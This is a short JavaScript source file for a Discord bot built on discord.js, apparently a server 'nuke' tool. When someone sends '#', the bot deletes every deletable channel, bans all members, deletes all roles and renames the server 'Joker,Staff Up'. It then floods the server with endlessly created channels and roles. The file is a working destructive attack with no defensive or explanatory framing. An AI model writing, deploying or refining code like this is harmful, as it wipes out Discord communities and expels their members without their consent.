const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "#";
client.on("message", message => {
  if (message.content === "#") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Joker,Staff Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Joker,Staff Up", "text");///////bo channel 
        message.guild.createChannel("Joker,SaffUp", "voice");////bo voice
        message.guild.createRole({ name: "Joker,Staff Up" });////nawek dane bo role kan
      });
    }
  }
});

client.login("")
